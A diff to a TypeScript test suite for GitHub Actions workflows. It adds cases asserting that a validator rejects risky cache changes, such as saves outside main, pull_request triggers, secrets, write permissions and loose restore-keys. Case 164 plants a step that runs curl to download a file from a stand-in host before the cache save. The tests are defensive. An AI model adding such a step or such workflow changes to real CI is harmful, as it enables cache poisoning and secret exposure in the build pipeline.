@@ -18,6 +18,7 @@ import {
   ANDROID_SDK_PARTS,
   BB_AMD64_LINUX_SHA256,
   BROWSER_PATHS,
+  CACHES,
   CHECK_BB,
   CHECKS_GROUP,
   CHECKS_ON,
@@ -238,6 +239,109 @@ for (const [name, changes] of Object.entries(CHANGES)) {
     const files = realFiles();
     for (const change of changes) change(files);
     assert.notDeepEqual(workflowProblems(files), [], "the rules let this change through");
+  });
+}
+
+// The caches (#203): only cache.yml, on pushes to main, may save one; checks.yml only restores;
+// the other workflows use none. Each change here must be turned away for the reason given, not
+// only because a job is no longer the one written in test/workflows.ts.
+const K = "cache.yml";
+const CACHE_ACTION_SHA = "55cc8345863c7cc4c66a329aec7e433d2d1c52a9";
+const cacheStep = (action: string, n: number): string => {
+  const c = CACHES[n] as Record<string, string>;
+  return `      - uses: ${action}@${CACHE_ACTION_SHA} # v6.1.0\n        with:\n          path: ${c.path}\n          key: ${c.key}\n`;
+};
+const GO_BUILD = "      - run: go build ./...\n";
+const AFTER_CHECKOUT = "          persist-credentials: false\n";
+const NOT_ONLY_MAIN = /^cache\.yml: saves a cache and is not triggered by a push to main only/;
+const CACHE_CHANGES: Record<string, { changes: Change[]; problem: RegExp }> = {
+  "150 a job of checks.yml with the action that also saves": {
+    changes: [replace(C, GO_BUILD, `${cacheStep("actions/cache", 0)}${GO_BUILD}`)],
+    problem: /^checks\.yml: line \d+: uses actions\/cache, which saves a cache: this workflow may only restore one/,
+  },
+  "151 a job of checks.yml with the action that only saves": {
+    changes: [replace(C, GO_BUILD, `${GO_BUILD}${cacheStep("actions/cache/save", 0)}`)],
+    problem: /^checks\.yml: line \d+: uses actions\/cache\/save, which saves a cache: this workflow may only restore one/,
+  },
+  "152 deploy-test.yml restoring a cache, so that what is deployed depends on it": {
+    changes: [replace(D, AFTER_CHECKOUT, `${AFTER_CHECKOUT}${cacheStep("actions/cache/restore", 0)}`)],
+    problem: /^deploy-test\.yml: line \d+: uses actions\/cache\/restore: this workflow may use no cache/,
+  },
+  "153 checks-browser.yml restoring a cache": {
+    changes: [replace(B, AFTER_CHECKOUT, `${AFTER_CHECKOUT}${cacheStep("actions/cache/restore", 0)}`)],
+    problem: /^checks-browser\.yml: line \d+: uses actions\/cache\/restore: this workflow may use no cache/,
+  },
+  "154 checks-ios.yml with the action that also saves": {
+    changes: [replace(I, AFTER_CHECKOUT, `${AFTER_CHECKOUT}${cacheStep("actions/cache", 1)}`)],
+    problem: /^checks-ios\.yml: line \d+: uses actions\/cache: this workflow may use no cache/,
+  },
+  "155 cache.yml also on pull_request, where a pull request's code would run before the save": {
+    changes: [replace(K, "on:\n  push:\n", "on:\n  pull_request:\n  push:\n")],
+    problem: NOT_ONLY_MAIN,
+  },
+  "156 cache.yml on a push to any branch": {
+    changes: [replace(K, "  push:\n    branches:\n      - main\n", "  push:\n")],
+    problem: NOT_ONLY_MAIN,
+  },
+  "157 cache.yml also on merge_group, whose branch holds a pull request's change": {
+    changes: [replace(K, "on:\n", `on:\n${MERGE_GROUP}`)],
+    problem: NOT_ONLY_MAIN,
+  },
+  "158 cache.yml also started by hand, on any branch": {
+    changes: [replace(K, "on:\n", "on:\n  workflow_dispatch:\n")],
+    problem: NOT_ONLY_MAIN,
+  },
+  "159 cache.yml in the concurrency group of the deploy, which would then wait for it": {
+    changes: [replace(K, "  group: cache\n", "  group: deploy-test\n")],
+    problem: /^cache\.yml: concurrency is not group cache, one run at a time and none cancelled/,
+  },
+  "160 a secret in cache.yml, which the step that saves would hold": {
+    changes: [replace(K, "    timeout-minutes: 30\n", `    timeout-minutes: 30\n    env:\n      T: ${SECRET}\n`)],
+    problem: /^the lines with "secrets" in them are /,
+  },
+  "161 cache.yml with a token that can write": {
+    changes: [replace(K, "permissions:\n  contents: read\n", "permissions:\n  contents: write\n")],
+    problem: /^cache\.yml: permissions is not exactly contents: read/,
+  },
+  "162 cache.yml with one more permission (actions: write can delete caches)": {
+    changes: [replace(K, "permissions:\n  contents: read\n", "permissions:\n  contents: read\n  actions: write\n")],
+    problem: /^cache\.yml: permissions is not exactly contents: read/,
+  },
+  "163 a job of cache.yml with its own permissions": {
+    changes: [replace(K, "    timeout-minutes: 30\n", "    timeout-minutes: 30\n    permissions:\n      contents: write\n")],
+    problem: /^cache\.yml: the jobs are not exactly the ones in test\/workflows\.ts/,
+  },
+  "164 one more step in cache.yml before the save": {
+    changes: [replace(K, "      - name: cargo clippy\n", "      - run: curl -o target/x https://example.invalid/x\n        working-directory: device-core\n      - name: cargo clippy\n")],
+    problem: /^cache\.yml: the jobs are not exactly the ones in test\/workflows\.ts/,
+  },
+  "165 a cache of checks.yml restored by the start of its key, so for another Cargo.lock or another Rust": {
+    changes: [replace(C, "          path: device-core/target\n", "          path: device-core/target\n          restore-keys: device-core-target-\n")],
+    problem: /^checks\.yml: job device-core: step 3: actions\/cache\/restore is not given exactly /,
+  },
+  "166 a cache of checks.yml with a key that leaves out the files": {
+    changes: [replace(C, `          key: ${(CACHES[1] as Record<string, string>).key}\n`, "          key: device-core-target\n")],
+    problem: /^checks\.yml: job device-core: step 3: actions\/cache\/restore is not given exactly /,
+  },
+  "167 a restored cache that fails the check when there is none": {
+    changes: [replace(C, "          path: device-core/target\n", "          path: device-core/target\n          fail-on-cache-miss: true\n")],
+    problem: /^checks\.yml: job device-core: step 3: actions\/cache\/restore is not given exactly /,
+  },
+  "168 a new workflow that saves a cache": {
+    changes: [addFile("cache-2.yml", `name: cache-2\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  x:\n    runs-on: ubuntu-24.04\n    steps:\n${cacheStep("actions/cache", 1)}`)],
+    problem: /^cache-2\.yml: line \d+: uses actions\/cache: this workflow may use no cache/,
+  },
+};
+
+for (const [name, { changes, problem }] of Object.entries(CACHE_CHANGES)) {
+  test(`turned away: ${name}`, () => {
+    const files = realFiles();
+    for (const change of changes) change(files);
+    const problems = workflowProblems(files);
+    assert.ok(
+      problems.some((p) => problem.test(p)),
+      `no problem like ${problem}: ${JSON.stringify(problems)}`,
+    );
   });
 }
 
